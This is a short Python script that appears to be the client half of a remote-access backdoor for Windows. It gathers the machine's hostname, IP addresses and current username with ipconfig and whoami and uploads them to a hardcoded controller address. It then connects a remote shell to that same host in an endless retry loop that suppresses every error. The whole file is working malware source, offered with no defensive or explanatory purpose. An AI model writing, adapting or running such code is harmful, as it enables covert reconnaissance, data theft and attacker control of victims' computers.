#  written by medusa


import upload
import socket
import subprocess
import shell_client as shell

ipadress = "192.168.178.69"
port_httpserver = 9761
port_shell = 12345


def command_call(command):
    output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout.decode('utf-8').strip()


def puffer():
    upload.upload("none", "none", ipadress, port_httpserver)


def get_data():
    upload.upload("hostname", socket.gethostname(), ipadress, port_httpserver)
    puffer()
    upload.upload("ipv4", command_call("ipconfig | findstr IPv4"), ipadress, port_httpserver)
    puffer()
    upload.upload("ipv6", command_call("ipconfig | findstr IPv6"), ipadress, port_httpserver)
    puffer()
    upload.upload("user", command_call("whoami"), ipadress, port_httpserver)
    puffer()


if __name__ == "__main__":
    get_data()
    while True:
        try:
            shell.shell(ipadress, port_shell)
        except:
            pass
